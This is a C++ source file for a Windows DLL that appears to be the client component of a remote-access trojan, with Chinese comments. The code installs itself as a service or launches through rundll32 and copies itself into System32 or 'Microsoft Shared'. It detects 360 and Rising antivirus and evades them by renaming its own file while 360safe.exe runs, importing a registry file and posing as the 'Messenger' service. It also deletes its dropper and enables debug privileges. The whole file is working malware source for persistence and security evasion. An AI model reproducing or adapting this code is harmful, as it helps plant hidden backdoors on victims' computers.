
#include "stdafx.h"
#include "MyWorkMoudle.h"

SERVICE_STATUS_HANDLE	hService  = 0;	
SERVICE_STATUS			SrvStatus = {0};

CMyFunc	  m_gFunc;
UINT	  m_Ext_A[3] = {PS_EXT_A, PS_EXT_B, PS_EXT_C};
HINSTANCE m_ghInstance = NULL;
PSDLLINFO m_DllInfo = {0};

BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	if(DLL_PROCESS_ATTACH == ul_reason_for_call)
	{
		m_ghInstance = (HINSTANCE) hModule;
		WSADATA	data = {0};
		WSAStartup(MAKEWORD(2, 2), &data);
	}
    return TRUE;
}

void DoRundll32_RavWork(char* pDesFilePath)
{
//	_asm int 3;

	//修改启动后的命令
	m_DllInfo.m_DllStartCmd = PS_NORMAL_RUNDLL32;
	CopyMyFileToDesDir(pDesFilePath);

	//ServiceMain
	char m_FuncName[256] = {0};
	m_gFunc.GetMyString(10198, m_FuncName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//\"%s\",%s
	char m_SprintStr[256] = {0};
	m_gFunc.GetMyString(10235, m_SprintStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//rundll32.exe
	char m_RunDll32Str[256] = {0};
	m_gFunc.GetMyString(10236, m_RunDll32Str, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//启动rundll32.exe启动模块
	TCHAR m_Text[256] = {0};
	m_gFunc.sprintf(m_Text, m_SprintStr, pDesFilePath, m_FuncName);

	//启动目标模块
	m_gFunc.ShellExecute(NULL, NULL, m_RunDll32Str, m_Text, NULL, SW_SHOW);
}

//安装自启动
void InstallDll()
{
	//查找杀毒软件
	CheckKillSoft();

	//客户唯一标识
	if(m_gFunc.memcmp(m_DllInfo.m_ID, m_DllInfo.m_ExeFilePath, 16) == 0)
	{
		m_gFunc.CoCreateGuid((GUID*) m_DllInfo.m_ID);
	}

	//取EXE文件名称
	m_gFunc.GetModuleFileName(NULL, m_DllInfo.m_ExeFilePath, 255);

	//SystemRoot
	char m_SystemRootStr[256] = {0};
	m_gFunc.GetMyString(10241, m_SystemRootStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//%s\\System32\\%s.dll
	char m_System32SprintfStr[256] = {0};
	m_gFunc.GetMyString(10242, m_System32SprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//CommonProgramFiles
	char m_CommonProgramFilesStr[256] = {0};
	m_gFunc.GetMyString(10243, m_CommonProgramFilesStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//%s\\Microsoft Shared\\%s.dll
	char m_MicrosoftSharedSprintfStr[256] = {0};
	m_gFunc.GetMyString(10244, m_MicrosoftSharedSprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//安装目录
	char m_ImagePathSrc[MAX_PATH] = {0};
	char m_DesPath[256] = {0};
	if(m_DllInfo.m_DirAddr == 0)
	{
		m_gFunc.GetEnvironmentVariable(m_SystemRootStr, m_DesPath, 255);
		m_gFunc.sprintf(m_ImagePathSrc, m_System32SprintfStr, m_DesPath, m_DllInfo.m_ServiceName);
	}
	else
	{
		m_gFunc.GetEnvironmentVariable(m_CommonProgramFilesStr, m_DesPath, 255);
		m_gFunc.sprintf(m_ImagePathSrc, m_MicrosoftSharedSprintfStr, m_DesPath, m_DllInfo.m_ServiceName);
	}

#ifdef PS_VER_DINGZUO
	if(m_DllInfo.m_KillSoft == _KILL_360)
	{
		//过360主动防御
		Make360StartInfo();
		return;
	}
#endif

	if(m_DllInfo.m_KillSoft != _KILL_RAV)
	{
		//普通启动方式，不过任何主动防御
		CopyMyFileToDesDir(m_ImagePathSrc);

		//安装启动服务
		if(!MakeService())
		{
			//用注册表run启动
			m_DllInfo.m_KillSoft = _KILL_RAV;
		}
	}

	if(m_DllInfo.m_KillSoft == _KILL_RAV)
	{
		//注册表run启动，能过瑞星主动防御
		DoRundll32_RavWork(m_ImagePathSrc);
		MakeRavStartInfo(m_ImagePathSrc);
	}
}

void WINAPI ServiceMain(ULONG dwArgc, LPTSTR* lpszArgv)
{
//	_asm int 3;

	//取命令
	DWORD nCmd = 0;
	if(dwArgc == DLL_LOAD_FLAG)
	{
		//pcinit.exe传进来的数据
		nCmd = *((DWORD*) lpszArgv[0]);
	}

	//加载字串表
	BYTE* pModule = NULL;
	if(nCmd == DLL_START_INSTALL)
	{
		pModule = (BYTE*) lpszArgv[1];
	}
	else
	{
		pModule = (BYTE*) m_ghInstance;
	}
	if(!m_gFunc.LoadMyData(pModule))
	{
		return;
	}

	//加载全局参数
	if(nCmd == DLL_START_INSTALL)
	{
		//从pcinit.exe传来
		m_gFunc.memcpy(&m_DllInfo, lpszArgv[2], sizeof(m_DllInfo));
	}
	else
	{
		//工作过程取任务全局信息
		if(!GetFileSaveInfoFromMoudle())
		{
			return;
		}
	}

	//rundll32.exe
	char m_RunDll32Str[256] = {0};
	m_gFunc.GetMyString(10236, m_RunDll32Str, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//svchost.exe
	char m_SvchostStr[256] = {0};
	m_gFunc.GetMyString(10246, m_SvchostStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//查看启动方式
	char m_ModuleFilePath[256] = {0};
	m_gFunc.GetModuleFileName(NULL, m_ModuleFilePath, 255);
	m_gFunc.CharLower(m_ModuleFilePath);

	if(m_gFunc.strstr(m_ModuleFilePath, m_RunDll32Str) != NULL)		//rundll32.exe启动
	{
		if(m_DllInfo.m_DllStartCmd == PS_NORMAL_RUNDLL32)
		{
			//启动连接工作线程
			m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE ) DoMainWorkThread, (LPVOID) m_gFunc.GetCurrentThreadId(), 0, NULL);

			//等待线程退出
			MSG msg;
			while(m_gFunc.GetMessage(&msg, 0, 0, 0))
			{
				if(WM_CLOSE_CLIENT_THREAD == msg.message)
				{
					break;
				}
 			}
		}

#ifdef PS_VER_DINGZUO
		else if(m_DllInfo.m_DllStartCmd == PS_NORMAL_360_MAKE_REG)
		{
			//%sreg.reg
			char m_RegFileSprintfStr[256] = {0};
			m_gFunc.GetMyString(10239, m_RegFileSprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//-s \"%s\"
			char m_SprintfStr[256] = {0};
			m_gFunc.GetMyString(10247, m_SprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//regedit.exe
			char m_RegeditStr[256] = {0};
			m_gFunc.GetMyString(10248, m_RegeditStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//修改注册表
			char m_RegFileName[256] = {0};
			m_gFunc.GetTempPath(200, m_RegFileName);
			m_gFunc.sprintf(m_RegFileName + m_gFunc.strlen(m_RegFileName), m_RegFileSprintfStr, m_DllInfo.m_ServiceName);
			char m_Cmdlines[256] = {0};
			m_gFunc.sprintf(m_Cmdlines, m_SprintfStr,  m_RegFileName);
			m_gFunc.ShellExecute(NULL, NULL, m_RegeditStr, m_Cmdlines, NULL, SW_SHOW);

			//拷贝文件到目录

			//SystemRoot
			char m_SystemRootStr[256] = {0};
			m_gFunc.GetMyString(10241, m_SystemRootStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//%s\\System32\\%s.dll
			char m_System32SprintfStr[256] = {0};
			m_gFunc.GetMyString(10242, m_System32SprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//CommonProgramFiles
			char m_CommonProgramFilesStr[256] = {0};
			m_gFunc.GetMyString(10243, m_CommonProgramFilesStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//%s\\Microsoft Shared\\%s.dll
			char m_MicrosoftSharedSprintfStr[256] = {0};
			m_gFunc.GetMyString(10244, m_MicrosoftSharedSprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

			//安装目录
			char m_ImagePathSrc[MAX_PATH] = {0};
			char m_DesPath[256] = {0};
			if(m_DllInfo.m_DirAddr == 0)
			{
				m_gFunc.GetEnvironmentVariable(m_SystemRootStr, m_DesPath, 255);
				m_gFunc.sprintf(m_ImagePathSrc, m_System32SprintfStr, m_DesPath, m_DllInfo.m_ServiceName);
			}
			else
			{
				m_gFunc.GetEnvironmentVariable(m_CommonProgramFilesStr, m_DesPath, 255);
				m_gFunc.sprintf(m_ImagePathSrc, m_MicrosoftSharedSprintfStr, m_DesPath, m_DllInfo.m_ServiceName);
			}

			m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE ) DoMainWorkThread, (LPVOID) m_gFunc.GetCurrentThreadId(), 0, NULL);

			//等待监控失效
			m_gFunc.Sleep(30000);

			//拷贝文件到目录
			char m_ModuleName[256] = {0};
			m_gFunc.GetModuleFileName(m_ghInstance, m_ModuleName, 255);
			m_gFunc.CopyFile(m_ModuleName, m_ImagePathSrc, FALSE);

			//等待线程退出
			MSG msg;
			while(m_gFunc.GetMessage(&msg, 0, 0, 0))
			{
				if(WM_CLOSE_CLIENT_THREAD == msg.message)
				{
					break;
				}
 			}
		}
#endif

	}
	else if(m_gFunc.strstr(m_ModuleFilePath, m_SvchostStr) != NULL)	//svchost.exe启动
	{
		SrvStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
		SrvStatus.dwCurrentState = SERVICE_START_PENDING;
		SrvStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
		SrvStatus.dwWin32ExitCode = 0;
		SrvStatus.dwServiceSpecificExitCode = 0;
		SrvStatus.dwCheckPoint = 0;
		SrvStatus.dwWaitHint = 0;

		//服务名称
		char m_ServiceName[256] = {0};
		m_gFunc.strcpy(m_ServiceName, m_DllInfo.m_ServiceName);

#ifdef PS_VER_DINGZUO
	
		if(m_DllInfo.m_KillSoft == _KILL_360)
		{
			//Messenger
			m_gFunc.GetMyString(10294, m_ServiceName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		}

#endif

		hService = m_gFunc.RegisterServiceCtrlHandler(m_ServiceName, ServiceCtrl);
		if(hService != NULL) 
		{
			//开始工作
			ReportStatus(SERVICE_RUNNING, 0, 0);
			DoMainWork(0);
			ReportStatus(SERVICE_STOPPED, 0, 0);
		}
	}
	else if(DLL_START_INSTALL == nCmd)								//pcinit.exe启动
	{
		InstallDll();
	}
}

int ReportStatus(DWORD dState, DWORD dCode, DWORD dwWaitHint)
{
	static DWORD dwCheckPoint = 1;
	SrvStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
	SrvStatus.dwCurrentState = dState;
	SrvStatus.dwWin32ExitCode = dCode;
	SrvStatus.dwWaitHint = dwWaitHint;
	SrvStatus.dwCheckPoint = 0;
	m_gFunc.SetServiceStatus(hService, &SrvStatus);
	return 1;
}

void WINAPI ServiceCtrl(DWORD code)
{
	switch(code)
	{                           
		case SERVICE_CONTROL_STOP:
			{
				ReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
				return;
			}
		default : break;
	}
	ReportStatus(SrvStatus.dwCurrentState, NO_ERROR, 0);
}

BOOL CheckProcessIsExist(char* sProcessName)
{
	//SeDebugPrivilege
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10217, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	m_gFunc.CharLower(sProcessName);

	//枚举当前系统进程列表
	HANDLE hToken = NULL;  
	TOKEN_PRIVILEGES tkp = {0};   
	m_gFunc.OpenProcessToken(m_gFunc.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken); 
	m_gFunc.LookupPrivilegeValue(NULL, m_TmpStr, &tkp.Privileges[0].Luid); 
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	m_gFunc.AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES) NULL, 0); 
	DWORD dId[4096] = {0};
	DWORD nSize = 0;
	if(!m_gFunc.EnumProcesses(dId, sizeof(DWORD) * 4096, &nSize))
	{
		return FALSE;
	}

	//查看进程列表中此进程是否存在
	for(DWORD i = 0; i < nSize / sizeof(DWORD); i++)
	{
		TCHAR m_EnumProcessName[256] = {0};
		GetMoudleMame(dId[i], m_EnumProcessName);
		m_gFunc.CharLower(m_EnumProcessName);

		if(m_gFunc.strstr(m_EnumProcessName, sProcessName) != NULL)
		{
			return TRUE;
		}
	}
	return FALSE;
}

DWORD Monitor360safeThread(LPVOID lPvoid)
{
	char m_SrcFileName[256] = {0};
	m_gFunc.GetModuleFileName(m_ghInstance, m_SrcFileName, 255);

	char m_TmpFileName[256] = {0};
	m_gFunc.strcpy(m_TmpFileName, m_SrcFileName);
	char* pFind = m_gFunc.strrchr(m_TmpFileName, '.');
	*pFind = 0;

	//tmp.dll
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10312, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.strcat(m_TmpFileName, m_TmpStr);

	//360safe.exe
	char m_360SafeStr[256] = {0};
	m_gFunc.GetMyString(10310, m_360SafeStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	while(1)
	{
		if(CheckProcessIsExist(m_360SafeStr))
		{
			//修改原始文件名
			m_gFunc.MoveFile(m_SrcFileName, m_TmpFileName);

			//等待360safe退出
			while(CheckProcessIsExist(m_360SafeStr))
			{
				m_gFunc.Sleep(50);
			}
			
			//恢复原始文件名
			m_gFunc.MoveFile(m_TmpFileName, m_SrcFileName);
		}
		m_gFunc.Sleep(50);
	}
}

void DoMainWork(DWORD nParentThreadId)
{
	//360tray.exe
	char Kill360Str[256] = {0};
	m_gFunc.GetMyString(10220, Kill360Str, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	if(CheckProcessIsExist(Kill360Str))
	{
		//监控360云查杀
		m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE ) Monitor360safeThread, 0, 0, NULL);
	}

	//删除exe文件
	WIN32_FILE_ATTRIBUTE_DATA m_Data = {0};
	if(m_DllInfo.m_IsDel && m_DllInfo.m_ComFileLen == 0)
	{
		for(int i = 0; i < 10000; i++)
		{
			m_gFunc.DeleteFile(m_DllInfo.m_ExeFilePath);
			if(!m_gFunc.GetFileAttributesEx(m_DllInfo.m_ExeFilePath, GetFileExInfoStandard, &m_Data))
			{
				break;
			}
			m_gFunc.Sleep(1);
		}
	}

	//启动工作过程
	CMyWorkMoudle m_WorkModule;
	m_WorkModule.nParentThreadId = nParentThreadId;
	m_WorkModule.DoWork();
}

DWORD DoMainWorkThread(LPVOID lPvoid)
{
	DoMainWork((DWORD) lPvoid);
	return 0;
}



